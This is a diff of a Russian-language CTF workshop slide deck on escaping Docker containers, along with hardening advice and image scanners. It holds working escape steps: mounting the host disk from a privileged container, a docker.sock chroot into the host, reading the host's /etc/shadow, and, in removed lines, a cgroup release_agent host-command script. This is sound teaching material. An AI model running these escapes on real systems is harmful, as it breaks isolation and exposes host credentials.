@@ -2,6 +2,53 @@
 marp: true
 theme: default
 paginate: true
+style: |
+  .timeline {
+    position: fixed;
+    top: 12px;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    gap: 6px;
+    font-size: 20px;
+    z-index: 1000;
+  }
+  .timeline-item {
+    padding: 5px 14px;
+    border-radius: 3px;
+    background: #ddd;
+    color: #888;
+    font-weight: 400;
+    white-space: nowrap;
+  }
+  .timeline-item.done {
+    background: #eee;
+    color: #aaa;
+  }
+  .timeline-item.current {
+    background: #000;
+    color: #fff;
+    font-weight: 600;
+  }
+  .timeline-item.future {
+    background: #eee;
+    color: #aaa;
+  }
+  header {
+    color: #9e9e9eff;
+    font-size: 16px;
+    text-align: center;
+    padding: 10px 0;
+  }
+  footer {
+    color: #9e9e9eff;
+    font-size: 14px;
+    text-align: center;
+    padding: 10px 0;
+  }
+
+header: "Побег из докер-контейнера"
+footer: "Тачков Максим | Новогодний CTF 2026 - Взламывай, Защищай, Побеждай!"
 ---
 
 # Побег из докер-контейнера
@@ -12,17 +59,33 @@ paginate: true
 
 ---
 
-## План воркшопа (60 минут)
+<div class="timeline">
+  <div class="timeline-item future">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
-1. **Введение** - 5 мин
-2. **3 практических задания** - 45 мин
+## План воркшопа
+
+1. **Реальные инициденты**
+2. **Векторы атаки**
+
    - Privileged контейнеры
    - Docker socket escape
    - CAP_SYS_ADMIN побег
-3. **Инструменты диагностики** (Trivy/Scout) - 7 мин
-4. **Защита и выводы** - 3 мин
+
+3. **Лучшие практики для защиты**
+4. **Инструменты диагностики** (Trivy/Scout)
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item future">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
 ## Для кого этот воркшоп?
 
@@ -35,14 +98,21 @@ paginate: true
 
 **Уровень:** Intermediate (базовые знания Docker требуются)
 
-**Что получите:**
+<!-- **Что получите:**
 
 - Понимание реальных векторов атак на контейнеры
 - Практический опыт побега из контейнеров
 - Навыки сканирования образов (Trivy/Scout)
-- Готовые примеры безопасных конфигураций
+- Готовые примеры безопасных конфигураций -->
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item future">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
 ## Prerequisites: Что нужно знать?
 
@@ -58,9 +128,20 @@ docker ps                   # Список запущенных контейне
 docker exec -it <id> bash   # Подключиться к контейнеру
 ```
 
+```
+docker run -d -p 3030:3000 --name=grafana grafana/grafana-enterprise
+```
+
 **Образ** = шаблон с ОС и приложением | **Контейнер** = запущенный процесс из образа
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item future">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
 ## Введение: Что такое контейнер?
 
@@ -88,43 +169,102 @@ docker run -it ubuntu:latest /bin/bash
 
 --- -->
 
+<div class="timeline">
+  <div class="timeline-item current">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# Реальные инциденты
+
+---
+
+<div class="timeline">
+  <div class="timeline-item current">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
 ## Реальные инциденты
 
-**Tesla Kubernetes (2018)**
-
-- Незащищенная Kubernetes консоль без пароля
-- Злоумышленники развернули криптомайнеры
-- Доступ к AWS credentials из контейнеров
-
-**Graboid Worm (2019)**
+**Graboid Worm (2019)** 📚 [Palo Alto Unit 42: Graboid worm](https://unit42.paloaltonetworks.com/graboid-first-ever-cryptojacking-worm-found-in-images-on-docker-hub/)
 
 - Первый worm для Docker
 - Сканировал интернет на открытые Docker API (порт 2375)
 - Запускал контейнеры с криптомайнерами
 - **~2000 хостов заражено**
 
+💡 Docker имеет API для удаленного управления. Многие оставляли его открытым в интернет — червь автоматически находил такие серверы и заражал их
+
 ---
 
-## Реальные инциденты (продолжение)
+<div class="timeline">
+  <div class="timeline-item current">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
-**Docker Hub Breach (2019)**
+**Docker Hub Breach (2019)** 📚 [SecurityWeek: Docker Hub Breach](https://www.securityweek.com/docker-hub-breach-hits-190000-accounts/)
 
 - Компрометация 190,000 аккаунтов
 - Утечка токенов GitHub и Bitbucket из образов
 - Проблема: разработчики хранили секреты в образах
 
-**TeamTNT Campaign (2020-2023)**
+💡 Взломали базу данных Docker Hub (главного репозитория образов). Получили доступ к паролям и токенам для GitHub — теперь злоумышленники могли изменять код проектов жертв
+
+---
+
+<div class="timeline">
+  <div class="timeline-item current">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+**TeamTNT Campaign (2020-2023)** 📚 [Sysdig: TeamTNT Analysis](https://www.sysdig.com/blog/real-cost-cryptomining-teamtnt/) | [Unit 42: Hildegard Malware](https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/)
 
 - Крупнейшая кампания атак на контейнеры
 - Эксплуатация открытых Docker API и Kubernetes
 - Кража AWS credentials, криптомайнинг, backdoors
-- Миллионы сканирований в день
+- **>10,000 скомпрометированных систем**
+
+💡 Организованная группа хакеров несколько лет сканировала весь интернет в поисках неправильно настроенных контейнеров. Украденные AWS ключи давали доступ к облачным счетам компаний
+
+---
+
+<div class="timeline">
+  <div class="timeline-item current">Инциденты</div>
+  <div class="timeline-item future">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
 **Вывод:** Неправильная конфигурация = реальная угроза
 
 ---
 
-## Вектор #1: Privileged контейнеры
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# Векторы атаки
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## 🏹 Вектор #1: Privileged контейнеры
 
 **Проблема:** `--privileged` флаг отключает большинство защит
 
@@ -140,25 +280,60 @@ docker run --privileged -it ubuntu /bin/bash
 
 ---
 
-## Подготовка: Запуск заданий
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
-**Для организатора воркшопа:**
+# ❓ Вопрос
+
+В каких случаях вообще контейнер может быть запущен небезопасно, зачем запускать с privelleged?
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+В каких случаях вообще контейнер может быть запущен небезопасно, зачем запускать с privelleged?
+
+> - Разработка и тестрирование,
+> - работа с ядром и драйверами,
+> - исследование уязвимостей
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## Подготовка: Запуск заданий
 
 ```bash
 # Задание 1: Privileged контейнер
 echo "FLAG{pr1v1leged_m0de_danger}" > /root/flag.txt
+
 docker run -it --privileged --name ctf-task1 ubuntu
-
-# Задание 2: Docker socket
-docker run -it -v /var/run/docker.sock:/var/run/docker.sock \
-  --name ctf-task2 docker:latest sh
-
-# Задание 3: CAP_SYS_ADMIN
-docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined \
-  --name ctf-task3 ubuntu
 ```
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
 ## ✅ Задание 1: Побег через privileged режим
 
@@ -169,15 +344,51 @@ docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined \
 **Пошаговый план:**
 
 1. Установите утилиту для работы с дисками`apt-get update` `apt-get -y install fdisk`
-2. Проверьте доступные диски: `fdisk -l`
+2. Проверьте доступные диски: `fdisk -l`,
 3. Найдите основной диск хоста (обычно `/dev/sda1` или `/dev/vda1`)
-4. Создайте точку монтирования: `mkdir /mnt/host`
-5. Смонтируйте диск: `mount /dev/sda1 /mnt/host`
-6. Теперь ФС хоста доступна: `cat /mnt/host/root/flag.txt`
+4. Смонтируйте диск: `mkdir /mnt/host && mount /dev/sda1 /mnt/host`
+5. Теперь ФС хоста доступна: `cat /mnt/host/root/flag.txt`
 
 ---
 
-## Вектор #2: Небезопасные монтирования
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+Как злоумышленник может получить доступ к конетейнеру?
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+Как злоумышленник может получить доступ к конетейнеру?
+
+> - уязвимости в приложениях внутри контейнера
+> - уязвимости в пакетах/библиотеках (Supply Chain Attack)
+> - утечка credentials
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## 🏹 Вектор #2: Небезопасные монтирования
 
 **Проблема:** Монтирование критичных директорий хоста
 
@@ -194,6 +405,61 @@ docker run -v /var/run/docker.sock:/var/run/docker.sock
 
 ---
 
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+В каких случаях может быть примонтирован docker socket?
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+В каких случаях может быть примонтирован docker socket?
+
+> - В ci/cd, чтобы собирать образы
+> - В инструментах управления контейнерами (интерфейсах)
+> - Для мониторинга (Prometheus)
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## Подготовка: Запуск заданий
+
+```bash
+# Задание 2: Docker socket
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock \
+  --name ctf-task2 docker:latest sh
+
+```
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
 ## ✅ Задание 2: Docker socket escape
 
 **Сценарий:** В контейнере примонтирован `/var/run/docker.sock`
@@ -202,19 +468,58 @@ docker run -v /var/run/docker.sock:/var/run/docker.sock
 
 **Пошаговый план:**
 
-1. Проверьте наличие socket: `ls -la /var/run/docker.sock`
-2. Посмотрите запущенные контейнеры: `docker ps`
-3. Запустите privileged контейнер с монтированием хост-системы:
+1. Посмотрите запущенные контейнеры: `docker ps`
+2. Запустите privileged контейнер с монтированием хост-системы:
    ```bash
    docker run -it --privileged -v /:/host alpine chroot /host
    ```
-4. Вы теперь root на хосте!
-5. Найдите флаг: `cat /root/flag.txt`
-6. Найдите новый контейнер на хосте
+3. Найдите флаг: `cat /root/flag.txt`
+4. Найдите новый контейнер на хосте
 
 ---
 
-## Вектор #3: Misconfigured capabilities
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+Как мы полчуили доступ к /root/flag.txt, мы ведь не монтировали его внутрь первого контейнера?
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+Как мы полчуили доступ к /root/flag.txt, мы ведь не монтировали его внутрь первого контейнера?
+
+> Docker socket — это не файл с данными, а API для управления Docker daemon. Когда ты выполняешь docker run ... из контейнера A:
+
+> 1.  Команда идёт через сокет к Docker daemon на хосте
+> 2.  Daemon работает с root-правами на хосте
+> 3.  Daemon создаёт новый контейнер B (не внутри A, а рядом с ним!)
+> 4.  В контейнер B монтируется -v /:/host — вся файловая система хоста
+> 5.  chroot /host делает корнем ФС хоста
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## 🏹 Вектор #3: Misconfigured capabilities
 
 **Проблема:** Излишние capabilities
 
@@ -225,56 +530,374 @@ docker run -v /var/run/docker.sock:/var/run/docker.sock
 - `CAP_SYS_MODULE` - загрузка модулей ядра
 - `CAP_DAC_READ_SEARCH` - обход проверок чтения
 
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+В каких случаях вообще контейнер могут запустить с --cap-add=SYS_ADMIN, --cap-add=DAC_READ_SEARCH?
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❓ Вопрос
+
+В каких случаях вообще контейнер могут запустить с --cap-add=SYS_ADMIN, --cap-add=DAC_READ_SEARCH?
+
+> - Docker-in-Docker (DinD). GitLab CI runners, Jenkins agents часто требуют это для сборки образов.
+> - Бэкап-агенты (Restic, Borg, Bacula)
+> - NFS-серверы
+> - Аудит/мониторинг/антивирусы
+> - Файловая индексация и поиск
+> - Rsync/синхронизация данных
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## Подготовка: Запуск заданий
+
 ```bash
-docker run --cap-add=SYS_ADMIN -it ubuntu
+# Запускаем контейнер с DAC_READ_SEARCH
+services:
+  vulnerable-dac:
+    build: .
+    container_name: vuln-dac
+    cap_add:
+      - DAC_OVERRIDE      # Игнорирует права на запись
+      - DAC_READ_SEARCH   # Игнорирует права на чтение
+    volumes:
+      - /etc:/host-etc:ro  # Монтируем /etc хоста (типичная ошибка!)
+    stdin_open: true
+    tty: true
 ```
 
 ---
 
-## Задание 3: CAP_SYS_ADMIN escape
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
-**Сценарий:** Контейнер запущен с `--cap-add=SYS_ADMIN`
+## ✅ Задание 3: DAC_READ_SEARCH
 
-**Цель:** Выполнить команду на хосте используя cgroups
+**Сценарий:** Контейнер запущен с `--cap-add=DAC_READ_SEARCH`
 
-**Техника: release_agent exploit**
+**Цель:** Получить доступ к привилегированному файлу хоста
 
-Cgroups позволяет указать программу, которая выполнится на хосте когда последний процесс в группе завершится.
+**Пошаговый план:**
 
-**Готовый скрипт:**
-
-```bash
-mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/sh' > /cmd
-echo "cat /root/flag.txt > $host_path/output" >> /cmd
-chmod a+x /cmd
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-```
-
-**Результат:** Читаем `/output` в контейнере для получения флага
-
-**Время:** 15-18 минут
+1. Запускаем уязвимый контейнер `docker compose up -d` и подключаемся к консоли контейнера `docker compose exec vulnerable-dac bash`
+2. Читаем файл, к которому нет доступа `cat /host-etc/shadow`
+3. ! Вне контейнера я не могу получить доступ к этоу файлу `cat /etc/shadow`. Членство в группе docker ≈ root-доступ к хосту. Это не баг, это особенность архитектуры
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item current">Векторы атаки</div>
+  <div class="timeline-item future">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
 ## Краткая сводка: 3 вектора побега
 
-| Вектор            | Требования           | Сложность | Защита                                   |
-| ----------------- | -------------------- | --------- | ---------------------------------------- |
-| **Privileged**    | `--privileged` флаг  | Легко     | Никогда не использовать                  |
-| **Docker socket** | Монтирование sock    | Легко     | Не монтировать без крайней необходимости |
-| **CAP_SYS_ADMIN** | Capability SYS_ADMIN | Средне    | `--cap-drop=ALL`, минимальные caps       |
+| Вектор              | Требования                 | Сложность | Защита                             |
+| ------------------- | -------------------------- | --------- | ---------------------------------- |
+| **Privileged**      | `--privileged` флаг        | Легко     | Никогда не использовать            |
+| **Docker socket**   | Монтирование sock          | Легко     | Не монтировать без необходимости   |
+| **DAC_READ_SEARCH** | Capability DAC_READ_SEARCH | Средне    | `--cap-drop=ALL`, минимальные caps |
 
-**Общий паттерн:** Неправильная конфигурация → доступ к ресурсам хоста → escape
+**Общий паттерн:** Неправильная конфигурация → доступ к ресурсам хоста → побег
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
 
 Суть защиты: даже если приложение взломают, контейнер должен быть настолько ограничен, что дальше двигаться некуда.
 
 ---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# Лучшие практики защиты
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## ❌ Безопасный Dockerfile: Плохой пример
+
+❓ Какие здесь есть уязвимости?
+
+```dockerfile
+FROM ubuntu:latest
+
+RUN apt-get update && apt-get install -y python3 curl
+
+ENV API_KEY="sk-1234567890abcdef"
+
+# Установка всех пакетов
+COPY requirements.txt .
+RUN pip install -r requirements.txt
+COPY app.py .
+
+CMD ["python3", "app,py"]
+```
+
+---
+
+**Проблемы:** latest тег, root, большой образ, секреты в образе
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## ✅ Безопасный Dockerfile: Хороший пример
+
+```dockerfile
+FROM python:3.11-alpine AS builder
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir --user -r requirements.txt
+
+# Multi-stage: минимальный финальный образ
+FROM python:3.11-alpine
+
+# Non-root пользователь
+RUN addgroup -g 1000 appgroup && \
+    adduser -D -u 1000 -G appgroup appuser
+...
+USER appuser
+
+CMD ["python3", "app.py"]
+```
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## Безопасный Dockerfile
+
+Попробуем!
+
+```
+docker run -it --privileged --name ctf-task1 --user appuser:appuser ubuntu-unpriveleged-user
+```
+
+1. Установите утилиту для работы с дисками`apt-get update` `apt-get -y install fdisk`
+2. Проверьте доступные диски: `fdisk -l`
+
+> Уменьшение поверхности атаки — даже внутри контейнера непривилегированный пользователь не может менять системные файлы, устанавливать пакеты, менять сетевые настройки.
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## Безопасный Dockerfile: Лучшие практики
+
+✅ Конкретные теги версий (`python:3.11-alpine`, не `latest`)
+✅ Минимальные базовые образы (`alpine`, `distroless`)
+✅ Multi-stage builds для уменьшения размера
+✅ Non-root пользователя
+✅ `.dockerignore` для исключения чувствительных файлов
+
+**Избегайте:**
+
+❌ `latest` тега
+❌ Запуска от root
+❌ Хранения секретов в образе (используйте secrets management)
+❌ Установки ненужных пакетов
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+## ✅ docker-compose.yml: Хороший пример
+
+```yaml
+services:
+  app:
+    image: myapp:1.2.3 # Конкретная версия
+    read_only: true # Read-only filesystem
+    tmpfs:
+      - /tmp
+    cap_drop:
+      - ALL
+    cap_add:
+      - NET_BIND_SERVICE # Только необходимые capabilities
+    security_opt:
+      - no-new-privileges:true
+    user: "1000:1000" # Non-root
+    volumes:
+      - ./data:/app/data:ro # Read-only монтирование
+```
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ❌ Все capabilities: Плохой пример
+
+Пробуем!
+
+```yaml
+# docker-compose.vulnerable.yml
+services:
+  vulnerable-app:
+    image: alpine
+    container_name: vulnerable-app
+    command: sh -c "sleep infinity"
+    # No capability restrictions - container has default ~14 capabilities
+```
+
+---
+
+```bash
+docker compose -f docker-compose.vulnerable.yml up -d
+
+# Подключимся к консоли контейнера
+docker exec -it vulnerable-app sh
+
+# Проверим capabilities внутри контейнера
+cat /proc/1/status | grep Cap
+
+# Контейнер может изменить владельца файла (CAP_CHOWN)
+touch /tmp/test
+chown 1000:1000 /tmp/test
+ls -la /tmp/test
+
+# Контейнер может использовать привилегированный порт
+(CAP_NET_BIND_SERVICE)
+apk add socat && socat TCP-LISTEN:80,fork STDOUT &
+```
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item current">Лучшие практики</div>
+  <div class="timeline-item future">Инструменты</div>
+</div>
+
+# ✅ Ограниченные capabilities: Хороший пример
+
+```yaml
+# docker-compose.secure.yml
+services:
+  secure-app:
+    image: alpine
+    container_name: secure-app
+    command: sh -c "sleep infinity"
+    cap_drop:
+      - ALL # Сначала отключаем всё
+    cap_add:
+      - NET_BIND_SERVICE # Включаем только то, что требуется
+    security_opt:
+      - no-new-privileges:true
+```
+
+---
+
+```bash
+docker compose -f docker-compose.secure.yml up -d
+
+# Подключимся к консоли контейнера
+docker exec -it secure-app sh
+
+# Проверим capabilities внутри контейнера
+cat /proc/1/status | grep Cap
+
+# Контейнер НЕ может изменить владельца файла (CAP_CHOWN)
+touch /tmp/test
+chown 1000:1000 /tmp/test
+ls -la /tmp/test
+
+# Контейнер может использовать привилегированный порт
+(CAP_NET_BIND_SERVICE)
+apk add socat && socat TCP-LISTEN:80,fork STDOUT &
+
+```
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
+
+# Инструменты диагностики
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
 
 ## Инструменты диагностики
 
@@ -293,6 +916,13 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 ---
 
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
+
 ## Trivy: Универсальный сканер
 
 **Что сканирует Trivy:**
@@ -303,16 +933,14 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 - Kubernetes манифесты
 - Terraform/CloudFormation
 
-**Установка:**
-
-```bash
-# Linux
-wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
-echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
-sudo apt-get update && sudo apt-get install trivy
-```
-
 ---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
 
 ## Trivy: Практическое использование
 
@@ -332,36 +960,22 @@ trivy image -f json -o results.json nginx:latest
 trivy image --ignore-unfixed nginx:latest
 ```
 
-**Пример вывода:**
-
-```
-nginx:latest (alpine 3.17.0)
-========================
-Total: 15 (CRITICAL: 2, HIGH: 5, MEDIUM: 8)
-
-┌───────────────┬──────────────┬──────────┬───────────────────┐
-│   Library     │ Vulnerability│ Severity │  Installed Ver    │
-├───────────────┼──────────────┼──────────┼───────────────────┤
-│ openssl       │ CVE-2023-XXXX│ CRITICAL │ 3.0.7-r0          │
-│ curl          │ CVE-2023-YYYY│ HIGH     │ 7.87.0-r0         │
-└───────────────┴──────────────┴──────────┴───────────────────┘
-```
-
-**Что показывает:** CVE ID, severity, пакет, версия, fix (если есть)
-
 ---
 
-## Docker Scout: Встроенный анализ
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
 
-**Интеграция с Docker:**
+## Docker Scout: Встроенный анализ
 
 ```bash
 # Анализ локального образа
 docker scout cves nginx:latest
-
 # Сравнение с рекомендациями
 docker scout recommendations nginx:latest
-
 # Быстрый обзор
 docker scout quickview nginx:latest
 ```
@@ -375,80 +989,68 @@ docker scout quickview nginx:latest
 
 ---
 
-## Практика: Сканируем уязвимый образ
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
 
-**Задание:**
+## Dockle: Сканирование на best-practices
 
-1. Соберите тестовый образ с уязвимостями
-2. Просканируйте его с помощью Trivy
-3. Проанализируйте результаты
-4. Найдите образ без критичных уязвимостей
-
-```dockerfile
-# Уязвимый Dockerfile
-FROM ubuntu:18.04
-RUN apt-get update && apt-get install -y curl
-COPY app.sh /app.sh
-CMD ["/app.sh"]
 ```
+dockle ubuntu:latest
+
+dockle ubuntu-unpriveleged-user
+```
+
+---
+
+<div class="timeline">
+  <div class="timeline-item done">Инциденты</div>
+  <div class="timeline-item done">Векторы атаки</div>
+  <div class="timeline-item done">Лучшие практики</div>
+  <div class="timeline-item current">Инструменты</div>
+</div>
+
+## Docker Bench for Security: Проверка на best-practices
 
 ```bash
-docker build -t vulnerable-app .
-trivy image --severity CRITICAL,HIGH vulnerable-app
-```
-
-**Цель:** Понять, как читать отчёт Trivy и принимать решения
-
----
-
-## Интеграция в CI/CD
-
-**GitHub Actions пример:**
-
-```yaml
-- name: Run Trivy vulnerability scanner
-  uses: aquasecurity/trivy-action@master
-  with:
-    image-ref: "myapp:${{ github.sha }}"
-    format: "sarif"
-    output: "trivy-results.sarif"
-    severity: "CRITICAL,HIGH"
-    exit-code: "1" # Fail build если найдены уязвимости
-```
-
-**GitLab CI:**
-
-```yaml
-trivy_scan:
-  image: aquasec/trivy:latest
-  script:
